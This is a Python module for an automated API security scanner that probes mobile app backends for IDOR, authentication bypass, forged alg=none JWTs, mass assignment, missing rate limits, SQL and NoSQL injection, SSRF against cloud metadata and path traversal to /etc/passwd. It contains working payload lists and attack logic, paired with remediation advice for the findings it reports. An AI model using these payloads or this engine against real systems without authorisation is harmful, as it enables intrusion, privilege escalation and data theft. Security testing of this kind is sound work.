"""
Mobile API Attack Engine
========================
Automated security testing of mobile application backend APIs.
Tests for IDOR, BOLA, auth bypass, mass assignment, rate limiting, and injection.
"""
from __future__ import annotations

import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from oneinfinity.mobile_tool_registry import UnifiedFinding

logger = logging.getLogger("oneinfinity.mobile.api_attack_engine")

# ---------------------------------------------------------------------------
# Optional HTTP client — prefer requests, fall back to urllib
# ---------------------------------------------------------------------------
try:
    import requests as _requests_lib

    _HTTP_BACKEND = "requests"
except ImportError:
    _requests_lib = None  # type: ignore
    _HTTP_BACKEND = "urllib"

try:
    import httpx as _httpx_lib

    if _HTTP_BACKEND == "urllib":
        _HTTP_BACKEND = "httpx"
except ImportError:
    _httpx_lib = None  # type: ignore

# ---------------------------------------------------------------------------
# Attack payloads
# ---------------------------------------------------------------------------

_SQL_PAYLOADS = [
    "' OR '1'='1",
    "\" OR 1=1--",
    "'; DROP TABLE users--",
    "1 AND SLEEP(5)--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1#",
]

_NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
]

_SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
]

_PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%2Fetc%2Fpasswd",
]

# IDOR ID variants
_IDOR_INT_VARIANTS = [1, 2, 100, 1000, 9999, -1, 0]
_IDOR_UUID_VARIANTS = [
    "00000000-0000-0000-0000-000000000001",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    str(uuid.uuid4()),
]

# Mass assignment extra fields to inject
_MASS_ASSIGNMENT_FIELDS = {
    "role": "admin",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "verified": True,
    "active": True,
    "balance": 99999.99,
    "credits": 9999,
    "premium": True,
    "subscription_tier": "enterprise",
    "permission_level": 9,
    "group": "admin",
    "userType": "admin",
    "accountType": "premium",
}

# JWT algorithm confusion header
_JWT_ALG_NONE_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

# Verbs for HTTP verb tampering
_EXTRA_VERBS = ["HEAD", "OPTIONS", "TRACE", "CONNECT", "PUT", "DELETE", "PATCH"]

# Error indicators in responses that hint at vulnerability
_SQL_ERROR_PATTERNS = re.compile(
    r"(sql syntax|mysql_fetch|ORA-\d+|postgres|pg_query|sqlite|syntax error.*near|"
    r"unclosed quotation|SQLSTATE|column.*does not exist|table.*doesn.*exist|"
    r"you have an error in your sql)",
    re.I,
)

_NOSQL_ERROR_PATTERNS = re.compile(
    r"(mongodb|bson|pymongo|mongo|CastError|ValidationError|"
    r"cannot read property.*of undefined|unexpected token)",
    re.I,
)

_STACK_TRACE_PATTERNS = re.compile(
    r"(Traceback|at [a-zA-Z_$][a-zA-Z0-9_$]*\.[a-zA-Z_$]|\bStackTrace\b|"
    r"Exception in thread|java\.lang\.|com\.mysql\.|NullPointerException|"
    r"IndexOutOfBoundsException|line \d+ in <module>)",
    re.I,
)

_SSRF_SUCCESS_PATTERNS = re.compile(
    r"(root:x:0:0|EC2|aws-metadata|169\.254|ami-id|instance-id|"
    r"local-hostname|security-credentials)",
    re.I,
)


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class APIAttackConfig:
    timeout: int = 10
    max_concurrent: int = 5
    verify_ssl: bool = False
    follow_redirects: bool = True
    headers: Dict[str, str] = field(default_factory=dict)
    test_idor: bool = True
    test_auth_bypass: bool = True
    test_mass_assignment: bool = True
    test_rate_limit: bool = True
    test_injections: bool = True


@dataclass
class APITestResult:
    endpoint: str
    test_type: str
    status_code: int
    vulnerable: bool
    evidence: str
    request_snippet: str
    response_snippet: str
    severity: str

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint,
            "test_type": self.test_type,
            "status_code": self.status_code,
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "request_snippet": self.request_snippet,
            "response_snippet": self.response_snippet,
            "severity": self.severity,
        }


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------


class MobileAPIAttackEngine:
    """
    Automated attacker against mobile application backend APIs.
    Tests IDOR, auth bypass, mass assignment, rate limiting, and injections.
    """

    def __init__(self, config: APIAttackConfig = None) -> None:
        self.config = config or APIAttackConfig()

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def test_endpoints(
        self, endpoints: list, auth_token: str = ""
    ) -> List[UnifiedFinding]:
        """
        Run all configured attack tests against the provided endpoint list.
        Returns a deduplicated list of UnifiedFinding objects.
        """
        if not endpoints:
            return []

        all_results: List[APITestResult] = []

        for ep in endpoints:
            # Normalise endpoint to dict
            if hasattr(ep, "url"):
                ep_dict = ep.to_dict() if hasattr(ep, "to_dict") else {"url": ep.url, "method": getattr(ep, "method", "GET")}
            elif isinstance(ep, dict):
                ep_dict = ep
            else:
                continue

            url = ep_dict.get("url", ep_dict.get("full_url", ""))
            if not url or not url.startswith("http"):
                continue

            # Skip WebSocket / deep link pseudo-endpoints
            method = ep_dict.get("method", "GET").upper()
            if method in ("WS", "BASE_URL", "DEEP_LINK"):
                continue

            logger.debug("Testing endpoint: %s %s", method, url)

            if self.config.test_idor:
                try:
                    all_results.extend(self._test_idor(ep_dict, auth_token))
                except Exception as exc:
                    logger.debug("IDOR test error for %s: %s", url, exc)

            if self.config.test_auth_bypass:
                try:
                    all_results.extend(self._test_auth_bypass(ep_dict))
                except Exception as exc:
                    logger.debug("Auth bypass error for %s: %s", url, exc)

            if self.config.test_mass_assignment:
                try:
                    all_results.extend(self._test_mass_assignment(ep_dict))
                except Exception as exc:
                    logger.debug("Mass assignment error for %s: %s", url, exc)

            if self.config.test_rate_limit:
                try:
                    all_results.extend(self._test_rate_limiting(ep_dict))
                except Exception as exc:
                    logger.debug("Rate limit error for %s: %s", url, exc)

            if self.config.test_injections:
                try:
                    all_results.extend(self._test_injections(ep_dict))
                except Exception as exc:
                    logger.debug("Injection error for %s: %s", url, exc)

            # Verb tampering
            try:
                all_results.extend(self._test_verb_tampering(ep_dict))
            except Exception as exc:
                logger.debug("Verb tampering error for %s: %s", url, exc)

        # Filter to only vulnerable results and convert
        vulnerable = [r for r in all_results if r.vulnerable]
        logger.info(
            "API attack engine: %d tests run, %d vulnerabilities found",
            len(all_results), len(vulnerable),
        )
        return self.to_unified_findings(vulnerable)

    # ------------------------------------------------------------------
    # IDOR / BOLA
    # ------------------------------------------------------------------

    def _test_idor(
        self, endpoint: dict, auth_token: str
    ) -> List[APITestResult]:
        """
        Replace numeric IDs and UUIDs in the URL with alternate values.
        Compare responses: if different user data is returned → IDOR.
        """
        results: List[APITestResult] = []
        url = endpoint.get("url", "")
        method = endpoint.get("method", "GET").upper()

        headers = dict(self.config.headers)
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"

        # Build variants for numeric IDs
        id_pattern = re.compile(r'(/\d+)(?=[/?#]|$)')
        uuid_pattern = re.compile(
            r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I
        )

        test_urls: List[Tuple[str, str]] = []

        # Numeric ID variants
        for m in id_pattern.finditer(url):
            original_id = int(m.group(1).strip("/"))
            for variant in _IDOR_INT_VARIANTS + [original_id + 1, original_id - 1]:
                if variant != original_id:
                    test_url = url[:m.start()] + f"/{variant}" + url[m.end():]
                    test_urls.append((test_url, f"IDOR numeric: {variant}"))

        # UUID variants
        for m in uuid_pattern.finditer(url):
            for alt_uuid in _IDOR_UUID_VARIANTS:
                test_url = url[:m.start()] + "/" + alt_uuid + url[m.end():]
                test_urls.append((test_url, f"IDOR UUID: {alt_uuid}"))

        if not test_urls:
            return results

        # Get baseline response (authenticated)
        baseline_status, _, baseline_body = self._make_request(method, url, headers)

        for test_url, desc in test_urls[:5]:  # Limit to 5 variants per endpoint
            status, resp_headers, body = self._make_request(method, test_url, headers)
            vulnerable, evidence = self._detect_vulnerability_in_response(body, "idor")

            # IDOR if: different user data accessible (success response with different content)
            if status in (200, 201) and body and body != baseline_body and len(body) > 20:
                vulnerable = True
                evidence = f"Different data returned for ID variant. Status: {status}, body length: {len(body)}"

            if vulnerable:
                results.append(APITestResult(
                    endpoint=url,
                    test_type="idor",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"{desc} — {evidence}",
                    request_snippet=f"{method} {test_url}",
                    response_snippet=body[:200] if body else "",
                    severity="high",
                ))
                break  # One IDOR finding per endpoint

        return results

    # ------------------------------------------------------------------
    # Auth bypass
    # ------------------------------------------------------------------

    def _test_auth_bypass(self, endpoint: dict) -> List[APITestResult]:
        """
        Test authentication bypass:
        - Remove auth header entirely
        - Empty/null Bearer token
        - JWT alg=none confusion
        - Role escalation via JWT claim modification
        """
        results: List[APITestResult] = []
        url = endpoint.get("url", "")
        method = endpoint.get("method", "GET").upper()
        base_headers = dict(self.config.headers)

        # ── Test 1: No auth header ────────────────────────────────
        status, _, body = self._make_request(method, url, base_headers)
        if self._is_successful_response(status, body):
            vulnerable, evidence = self._detect_vulnerability_in_response(body, "auth_bypass")
            if not evidence:
                evidence = f"Endpoint returned {status} without auth header"
            results.append(APITestResult(
                endpoint=url,
                test_type="auth_bypass_no_header",
                status_code=status,
                vulnerable=True,
                evidence=evidence,
                request_snippet=f"{method} {url} (no Authorization header)",
                response_snippet=body[:200] if body else "",
                severity="critical",
            ))

        # ── Test 2: Empty Bearer token ────────────────────────────
        headers_empty = dict(base_headers)
        headers_empty["Authorization"] = "Bearer "
        status, _, body = self._make_request(method, url, headers_empty)
        if self._is_successful_response(status, body):
            results.append(APITestResult(
                endpoint=url,
                test_type="auth_bypass_empty_token",
                status_code=status,
                vulnerable=True,
                evidence=f"Empty Bearer token accepted, returned {status}",
                request_snippet=f"{method} {url} Authorization: Bearer (empty)",
                response_snippet=body[:200] if body else "",
                severity="critical",
            ))

        # ── Test 3: "null" / "undefined" token ───────────────────
        for fake_token in ("null", "undefined", "None", "0", "false"):
            headers_fake = dict(base_headers)
            headers_fake["Authorization"] = f"Bearer {fake_token}"
            status, _, body = self._make_request(method, url, headers_fake)
            if self._is_successful_response(status, body):
                results.append(APITestResult(
                    endpoint=url,
                    test_type="auth_bypass_fake_token",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"Token '{fake_token}' accepted, returned {status}",
                    request_snippet=f"{method} {url} Authorization: Bearer {fake_token}",
                    response_snippet=body[:200] if body else "",
                    severity="critical",
                ))
                break

        # ── Test 4: JWT alg=none confusion ───────────────────────
        # Build a JWT with alg=none and admin payload
        try:
            alg_none_payload = _JWT_ALG_NONE_HEADER + ".eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ."
            headers_alg_none = dict(base_headers)
            headers_alg_none["Authorization"] = f"Bearer {alg_none_payload}"
            status, _, body = self._make_request(method, url, headers_alg_none)
            if self._is_successful_response(status, body):
                results.append(APITestResult(
                    endpoint=url,
                    test_type="jwt_alg_none",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"JWT with alg=none accepted, returned {status}",
                    request_snippet=f"{method} {url} Authorization: Bearer <alg=none JWT>",
                    response_snippet=body[:200] if body else "",
                    severity="critical",
                ))
        except Exception as exc:
            logger.debug("JWT alg=none test error: %s", exc)

        return results

    # ------------------------------------------------------------------
    # Mass assignment
    # ------------------------------------------------------------------

    def _test_mass_assignment(self, endpoint: dict) -> List[APITestResult]:
        """
        For POST/PUT/PATCH endpoints: inject extra privileged fields.
        Check if server accepts or reflects them.
        """
        results: List[APITestResult] = []
        url = endpoint.get("url", "")
        method = endpoint.get("method", "GET").upper()

        if method not in ("POST", "PUT", "PATCH"):
            return results

        headers = dict(self.config.headers)
        headers["Content-Type"] = "application/json"

        # Send request with mass-assignment payload
        body = dict(_MASS_ASSIGNMENT_FIELDS)
        status, resp_headers, resp_body = self._make_request(method, url, headers, body)

        vulnerable, evidence = self._detect_vulnerability_in_response(resp_body, "mass_assignment")

        # Additional heuristic: server reflects admin/privileged fields
        if resp_body:
            reflected_fields = []
            for f_name in ("role", "is_admin", "isAdmin", "admin", "permission_level"):
                if f_name in resp_body and ("admin" in resp_body.lower() or "true" in resp_body.lower()):
                    reflected_fields.append(f_name)
            if reflected_fields:
                vulnerable = True
                evidence = f"Server reflected privileged fields: {', '.join(reflected_fields)}"

        if vulnerable:
            results.append(APITestResult(
                endpoint=url,
                test_type="mass_assignment",
                status_code=status,
                vulnerable=True,
                evidence=evidence,
                request_snippet=f"{method} {url} body={json.dumps(body)[:120]}",
                response_snippet=resp_body[:200] if resp_body else "",
                severity="high",
            ))

        return results

    # ------------------------------------------------------------------
    # Rate limiting
    # ------------------------------------------------------------------

    def _test_rate_limiting(self, endpoint: dict) -> List[APITestResult]:
        """
        Send 20 rapid requests to the endpoint.
        If all succeed (no 429) → rate limiting is absent.
        """
        results: List[APITestResult] = []
        url = endpoint.get("url", "")
        method = endpoint.get("method", "GET").upper()
        headers = dict(self.config.headers)

        successes = 0
        throttled = 0
        request_count = 20

        for i in range(request_count):
            status, _, _ = self._make_request(method, url, headers)
            if status == 429:
                throttled += 1
            elif self._is_successful_response(status, ""):
                successes += 1

        if throttled == 0 and successes >= 15:
            results.append(APITestResult(
                endpoint=url,
                test_type="rate_limit_bypass",
                status_code=200,
                vulnerable=True,
                evidence=(
                    f"Sent {request_count} rapid requests — {successes} succeeded, "
                    f"{throttled} throttled. No rate limiting detected."
                ),
                request_snippet=f"{method} {url} x{request_count}",
                response_snippet=f"All {successes} responses: 200 OK",
                severity="medium",
            ))

        return results

    # ------------------------------------------------------------------
    # Injections
    # ------------------------------------------------------------------

    def _test_injections(self, endpoint: dict) -> List[APITestResult]:
        """
        Test SQL injection, NoSQL injection, SSRF, and path traversal.
        """
        results: List[APITestResult] = []
        url = endpoint.get("url", "")
        method = endpoint.get("method", "GET").upper()
        headers = dict(self.config.headers)

        # ── SQL injection ─────────────────────────────────────────
        for payload in _SQL_PAYLOADS[:3]:
            test_url, test_body = self._inject_payload(url, method, payload)
            status, _, body = self._make_request(
                method, test_url, dict(headers, **{"Content-Type": "application/json"}),
                test_body if test_body else None,
            )
            if _SQL_ERROR_PATTERNS.search(body or ""):
                results.append(APITestResult(
                    endpoint=url,
                    test_type="sql_injection",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"SQL error in response with payload: {payload[:40]}",
                    request_snippet=f"{method} {test_url} payload={payload[:40]}",
                    response_snippet=(body or "")[:200],
                    severity="critical",
                ))
                break
            if _STACK_TRACE_PATTERNS.search(body or ""):
                results.append(APITestResult(
                    endpoint=url,
                    test_type="sql_injection_stacktrace",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"Stack trace in response with payload: {payload[:40]}",
                    request_snippet=f"{method} {test_url}",
                    response_snippet=(body or "")[:200],
                    severity="high",
                ))
                break

        # ── NoSQL injection ───────────────────────────────────────
        for payload in _NOSQL_PAYLOADS[:2]:
            test_url, test_body = self._inject_payload(url, method, payload)
            status, _, body = self._make_request(
                method, test_url, dict(headers, **{"Content-Type": "application/json"}),
                test_body if test_body else None,
            )
            if _NOSQL_ERROR_PATTERNS.search(body or ""):
                results.append(APITestResult(
                    endpoint=url,
                    test_type="nosql_injection",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"NoSQL error in response with payload: {payload[:40]}",
                    request_snippet=f"{method} {test_url}",
                    response_snippet=(body or "")[:200],
                    severity="critical",
                ))
                break

        # ── SSRF ──────────────────────────────────────────────────
        if re.search(r'[?&](url|redirect|next|target|link|src|path|file|resource|uri|href|proxy)=', url, re.I):
            for ssrf_url in _SSRF_PAYLOADS[:3]:
                test_url = re.sub(
                    r'([?&](?:url|redirect|next|target|link|src|path|file|resource|uri|href|proxy)=)[^&]+',
                    r'\g<1>' + ssrf_url.replace("&", "%26"),
                    url, flags=re.I,
                )
                status, _, body = self._make_request("GET", test_url, headers)
                if _SSRF_SUCCESS_PATTERNS.search(body or ""):
                    results.append(APITestResult(
                        endpoint=url,
                        test_type="ssrf",
                        status_code=status,
                        vulnerable=True,
                        evidence=f"SSRF response contains internal data. Payload: {ssrf_url}",
                        request_snippet=f"GET {test_url}",
                        response_snippet=(body or "")[:200],
                        severity="critical",
                    ))
                    break

        # ── Path traversal ────────────────────────────────────────
        if re.search(r'[?&](file|path|name|resource|download|doc|template)=', url, re.I):
            for payload in _PATH_TRAVERSAL_PAYLOADS[:2]:
                test_url = re.sub(
                    r'([?&](?:file|path|name|resource|download|doc|template)=)[^&]+',
                    r'\g<1>' + payload.replace("/", "%2F"),
                    url, flags=re.I,
                )
                status, _, body = self._make_request("GET", test_url, headers)
                if body and ("root:x:0:0" in body or "[passwd]" in body.lower()):
                    results.append(APITestResult(
                        endpoint=url,
                        test_type="path_traversal",
                        status_code=status,
                        vulnerable=True,
                        evidence=f"Path traversal exposed /etc/passwd content. Payload: {payload}",
                        request_snippet=f"GET {test_url}",
                        response_snippet=(body or "")[:200],
                        severity="critical",
                    ))
                    break

        return results

    # ------------------------------------------------------------------
    # HTTP verb tampering
    # ------------------------------------------------------------------

    def _test_verb_tampering(self, endpoint: dict) -> List[APITestResult]:
        """
        Try unexpected HTTP verbs against the endpoint.
        Flag if unexpected methods succeed (return 200/201).
        """
        results: List[APITestResult] = []
        url = endpoint.get("url", "")
        declared_method = endpoint.get("method", "GET").upper()
        headers = dict(self.config.headers)

        verbs_to_test = [v for v in _EXTRA_VERBS if v != declared_method][:4]

        for verb in verbs_to_test:
            status, resp_headers, body = self._make_request(verb, url, headers)

            # Allow-methods header reveals accepted methods
            allow = resp_headers.get("Allow", "") or resp_headers.get("allow", "")

            if verb == "OPTIONS" and allow:
                sensitive_methods = [m for m in ("PUT", "DELETE", "PATCH", "TRACE") if m in allow]
                if sensitive_methods:
                    results.append(APITestResult(
                        endpoint=url,
                        test_type="verb_tampering_options",
                        status_code=status,
                        vulnerable=True,
                        evidence=f"OPTIONS reveals sensitive methods: {', '.join(sensitive_methods)} in Allow: {allow}",
                        request_snippet=f"OPTIONS {url}",
                        response_snippet=body[:100] if body else "",
                        severity="low",
                    ))

            elif verb == "TRACE" and status in (200, 405):
                if body and "TRACE" in body:
                    results.append(APITestResult(
                        endpoint=url,
                        test_type="http_trace_enabled",
                        status_code=status,
                        vulnerable=True,
                        evidence="HTTP TRACE method reflected request back (XST risk).",
                        request_snippet=f"TRACE {url}",
                        response_snippet=body[:100] if body else "",
                        severity="low",
                    ))

            elif verb not in ("OPTIONS", "HEAD", "TRACE") and status in (200, 201):
                results.append(APITestResult(
                    endpoint=url,
                    test_type=f"verb_tampering_{verb.lower()}",
                    status_code=status,
                    vulnerable=True,
                    evidence=f"Unexpected HTTP method {verb} returned {status}. May bypass authorization.",
                    request_snippet=f"{verb} {url}",
                    response_snippet=body[:100] if body else "",
                    severity="medium",
                ))

        return results

    # ------------------------------------------------------------------
    # HTTP request helper
    # ------------------------------------------------------------------

    def _make_request(
        self,
        method: str,
        url: str,
        headers: Dict[str, str],
        body: Optional[dict] = None,
    ) -> Tuple[int, Dict, str]:
        """
        Make an HTTP request and return (status_code, response_headers, response_body).
        Uses requests, httpx, or urllib depending on availability.
        """
        try:
            if _HTTP_BACKEND == "requests" and _requests_lib:
                return self._make_request_requests(method, url, headers, body)
            elif _HTTP_BACKEND == "httpx" and _httpx_lib:
                return self._make_request_httpx(method, url, headers, body)
            else:
                return self._make_request_urllib(method, url, headers, body)
        except Exception as exc:
            logger.debug("Request error %s %s: %s", method, url, exc)
            return 0, {}, ""

    def _make_request_requests(
        self,
        method: str,
        url: str,
        headers: Dict,
        body: Optional[dict],
    ) -> Tuple[int, Dict, str]:
        kwargs = {
            "headers": headers,
            "timeout": self.config.timeout,
            "verify": self.config.verify_ssl,
            "allow_redirects": self.config.follow_redirects,
        }
        if body is not None:
            kwargs["json"] = body

        resp = _requests_lib.request(method, url, **kwargs)
        resp_headers = dict(resp.headers)
        try:
            return resp.status_code, resp_headers, resp.text
        except Exception:
            return resp.status_code, resp_headers, ""

    def _make_request_httpx(
        self,
        method: str,
        url: str,
        headers: Dict,
        body: Optional[dict],
    ) -> Tuple[int, Dict, str]:
        kwargs = {
            "headers": headers,
            "timeout": self.config.timeout,
            "verify": self.config.verify_ssl,
            "follow_redirects": self.config.follow_redirects,
        }
        if body is not None:
            kwargs["json"] = body

        with _httpx_lib.Client(**{k: v for k, v in kwargs.items() if k != "follow_redirects"},
                                follow_redirects=self.config.follow_redirects) as client:
            resp = client.request(method, url, **{k: v for k, v in kwargs.items()
                                                   if k not in ("follow_redirects",)})
            return resp.status_code, dict(resp.headers), resp.text

    def _make_request_urllib(
        self,
        method: str,
        url: str,
        headers: Dict,
        body: Optional[dict],
    ) -> Tuple[int, Dict, str]:
        """Fallback using urllib (no SSL verification workaround applied)."""
        import ssl
        import urllib.request
        import urllib.error

        data = None
        if body is not None:
            data = json.dumps(body).encode("utf-8")

        req = urllib.request.Request(url, data=data, method=method, headers=headers)
        ctx = ssl.create_default_context()
        if not self.config.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            with urllib.request.urlopen(req, context=ctx, timeout=self.config.timeout) as resp:
                body_bytes = resp.read(50_000)
                resp_headers = dict(resp.headers)
                return resp.status, resp_headers, body_bytes.decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            body_bytes = b""
            try:
                body_bytes = e.read(10_000)
            except Exception:
                pass
            return e.code, dict(e.headers), body_bytes.decode("utf-8", errors="replace")

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _is_successful_response(self, status_code: int, body: str) -> bool:
        """Return True if the response looks like a successful API response."""
        if status_code in (200, 201, 202, 206):
            return True
        if status_code in (301, 302, 307, 308):
            return True  # Redirect after auth bypass
        # 400/403/404/429/500 are not successful
        return False

    def _detect_vulnerability_in_response(
        self, response_body: str, test_type: str
    ) -> Tuple[bool, str]:
        """
        Analyse response body for vulnerability indicators.
        Returns (vulnerable: bool, evidence: str).
        """
        if not response_body:
            return False, ""

        body = response_body[:5000]

        if test_type in ("sql_injection", "nosql_injection", "injection"):
            if _SQL_ERROR_PATTERNS.search(body):
                m = _SQL_ERROR_PATTERNS.search(body)
                return True, f"SQL error pattern: {m.group(0)[:60]}"
            if _NOSQL_ERROR_PATTERNS.search(body):
                m = _NOSQL_ERROR_PATTERNS.search(body)
                return True, f"NoSQL error pattern: {m.group(0)[:60]}"
            if _STACK_TRACE_PATTERNS.search(body):
                m = _STACK_TRACE_PATTERNS.search(body)
                return True, f"Stack trace: {m.group(0)[:60]}"

        elif test_type == "ssrf":
            if _SSRF_SUCCESS_PATTERNS.search(body):
                m = _SSRF_SUCCESS_PATTERNS.search(body)
                return True, f"SSRF internal data: {m.group(0)[:60]}"

        elif test_type == "idor":
            # Look for PII or user data patterns
            _pii_patterns = re.compile(
                r'("email"\s*:\s*"[^"]+@[^"]+"|"phone"\s*:\s*"\+?\d+"|'
                r'"ssn"\s*:\s*"[\d-]+"|"credit_card"\s*:\s*"\d+"|'
                r'"password"\s*:\s*"[^"]{4,}")',
                re.I,
            )
            if _pii_patterns.search(body):
                m = _pii_patterns.search(body)
                return True, f"Possible PII in response: {m.group(0)[:60]}"

        elif test_type == "mass_assignment":
            # Check if admin fields reflected
            if re.search(r'"(role|is_admin|isAdmin|admin)"\s*:\s*"?admin|true"?', body, re.I):
                return True, "Privileged field reflected in response"

        elif test_type == "auth_bypass":
            # Any data-like response is suspicious
            if body and len(body) > 30 and not re.search(r'(unauthorized|forbidden|denied|invalid)', body, re.I):
                return True, f"Data returned without auth, length={len(body)}"

        return False, ""

    def _inject_payload(
        self, url: str, method: str, payload: str
    ) -> Tuple[str, Optional[dict]]:
        """
        Inject a payload into the URL query params (GET) or body (POST/PUT).
        Returns (modified_url, body_dict_or_None).
        """
        from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if method in ("GET", "HEAD", "DELETE") and qs:
            # Inject into first query param
            first_key = next(iter(qs))
            qs[first_key] = [payload]
            new_query = urlencode(qs, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return new_url, None

        elif method in ("POST", "PUT", "PATCH"):
            # Inject into body — create a simple JSON body with the payload
            body_dict = {"q": payload, "query": payload, "search": payload}
            return url, body_dict

        # For GET without query params, append as query string
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}q={payload}", None

    # ------------------------------------------------------------------
    # Convert to UnifiedFinding
    # ------------------------------------------------------------------

    def to_unified_findings(
        self, results: List[APITestResult], target: str = ""
    ) -> List[UnifiedFinding]:
        """Convert APITestResult list to UnifiedFinding objects."""
        findings: List[UnifiedFinding] = []
        seen: set = set()

        _TEST_META = {
            "idor": (
                "IDOR / BOLA — Insecure Direct Object Reference",
                "CWE-639", 8.1,
                "Implement object-level authorization checks on every request. Never trust client-supplied IDs.",
            ),
            "auth_bypass_no_header": (
                "Authentication Bypass — No Auth Header Required",
                "CWE-306", 9.8,
                "Require valid authentication for all non-public endpoints.",
            ),
            "auth_bypass_empty_token": (
                "Authentication Bypass — Empty Token Accepted",
                "CWE-287", 9.1,
                "Validate that tokens are non-empty and properly signed before accepting them.",
            ),
            "auth_bypass_fake_token": (
                "Authentication Bypass — Fake Token Accepted",
                "CWE-287", 9.1,
                "Reject tokens that are null, undefined, or otherwise invalid.",
            ),
            "jwt_alg_none": (
                "JWT Algorithm Confusion (alg=none)",
                "CWE-327", 9.1,
                "Explicitly require HS256/RS256; reject tokens with alg=none. Use jwt.decode(token, key, algorithms=['HS256']).",
            ),
            "mass_assignment": (
                "Mass Assignment / Auto-Binding Vulnerability",
                "CWE-915", 7.5,
                "Use allowlists (DTO/schema) to restrict which fields are bindable from request body.",
            ),
            "rate_limit_bypass": (
                "Missing Rate Limiting",
                "CWE-770", 5.3,
                "Implement rate limiting per IP and per user. Return 429 with Retry-After header.",
            ),
            "sql_injection": (
                "SQL Injection Detected",
                "CWE-89", 9.8,
                "Use parameterised queries / prepared statements. Never concatenate user input into SQL.",
            ),
            "sql_injection_stacktrace": (
                "SQL Injection — Stack Trace Disclosure",
                "CWE-209", 7.5,
                "Suppress detailed error messages in production. Use parameterised queries.",
            ),
            "nosql_injection": (
                "NoSQL Injection Detected",
                "CWE-943", 9.1,
                "Sanitise all query operator fields; use schema validation libraries (Joi, Zod, etc.).",
            ),
            "ssrf": (
                "Server-Side Request Forgery (SSRF)",
                "CWE-918", 9.8,
                "Validate and allowlist URLs; block internal IP ranges; use metadata service IMDSv2.",
            ),
            "path_traversal": (
                "Path Traversal",
                "CWE-22", 9.1,
                "Canonicalise file paths and validate against an allowlisted root directory.",
            ),
            "verb_tampering_options": (
                "HTTP Method Exposure via OPTIONS",
                "CWE-749", 3.5,
                "Restrict exposed HTTP methods. Disable TRACE. Return only methods actually supported.",
            ),
            "http_trace_enabled": (
                "HTTP TRACE Method Enabled",
                "CWE-16", 4.3,
                "Disable TRACE method on the web server (Apache: TraceEnable Off; Nginx: deny TRACE method).",
            ),
        }

        for r in results:
            key = (r.test_type, r.endpoint[:80])
            if key in seen:
                continue
            seen.add(key)

            prefix = r.test_type.replace("_", " ").title()
            meta = _TEST_META.get(r.test_type)
            if meta:
                title, cwe, cvss, recommendation = meta
            else:
                title = prefix
                cwe = ""
                cvss = 5.0
                recommendation = "Review endpoint security."

            # For verb tampering variants not in meta
            if r.test_type.startswith("verb_tampering_"):
                verb = r.test_type.split("verb_tampering_")[-1].upper()
                title = f"HTTP Method Tampering — {verb} Accepted"
                cwe = "CWE-749"
                cvss = 4.3
                recommendation = f"Restrict endpoint to intended HTTP methods; reject {verb}."

            findings.append(UnifiedFinding(
                title=f"{title}: {r.endpoint[:60]}",
                severity=r.severity,
                finding_type=r.test_type,
                tool="mobile_api_attack_engine",
                description=f"Automated API attack test '{r.test_type}' found a vulnerability at {r.endpoint}.",
                evidence=r.evidence,
                recommendation=recommendation,
                cwe=cwe,
                cvss_score=cvss,
                package=target,
                location=r.endpoint[:120],
                raw=r.to_dict(),
            ))

        return findings


# Module-level singleton
mobile_api_attack_engine = MobileAPIAttackEngine()
